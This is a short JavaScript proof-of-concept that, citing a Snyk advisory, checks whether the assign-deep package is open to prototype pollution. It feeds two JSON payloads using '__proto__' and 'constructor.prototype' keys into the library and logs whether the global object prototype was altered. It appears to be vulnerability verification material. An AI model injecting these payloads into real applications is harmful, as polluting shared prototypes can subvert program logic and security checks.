//https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
// test("prototype pollution in assign-deep ", () => {
//   const assign = require("assign-deep");
//   const payloads = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');

//   var obj = {};

//   expect({}.polluted).toBe(undefined);

//   assign({},payloads);
//   expect({}.polluted).toBe("yes");
// });

const assign = require("assign-deep");
const payloads = [
  '{"constructor": {"prototype": {"a0": true}}}',
  '{"__proto__": {"a1": true}}',
];

function check() {
  for (const p of payloads) {
    assign({}, JSON.parse(p));
  }
  for (let i = 0; i < payloads.length; i++) {
    if ({}[`a${i}`] === true) {
      console.log(`Vulnerable to Prototype Pollution via ${payloads[i]}`);
    }
  }
}

check();
